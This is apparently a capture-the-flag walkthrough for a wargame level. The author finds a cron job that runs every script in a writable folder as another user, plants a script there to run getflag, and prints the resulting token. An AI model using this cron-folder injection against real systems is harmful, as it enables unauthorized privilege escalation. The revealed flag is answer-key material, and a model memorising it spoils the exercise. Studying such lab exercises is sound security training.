# Level 05

## step 1 : try things
```
$ ls -la /*/* level05 | grep level05 2> /dev/null
-rw-r--r--+ 1 root mail  58 Apr 28 12:15 level05
```

## step 2 : read mail
```
$ cat /var/mail/level05
*/2 * * * * su -c "sh /usr/sbin/openarenaserver" - flag05
```
cron syntax : launch "sh /usr/sbin/openarenaserver" every 2 minutes

## step 3 : analyze /usr/sbin/openarenaserver
```
$ cat /usr/sbin/openarenaserver
#!/bin/sh

for i in /opt/openarenaserver/* ; do
        (ulimit -t 5; bash -x "$i")
        rm -f "$i"
done
```

## step 4 : run getflag with /usr/sbin/openarenaserver
 - Put a script to get the output of getflag in the folder /opt/openarenaserver/
```
$ echo 'getflag > /tmp/flag.out' > /opt/openarenaserver/test.sh
```

- wait max 2 minutes for cron to run the script

- read the output
```
$ cat /tmp/flag.out
Check flag.Here is your token : viuaaale9huek52boumoomioc
```
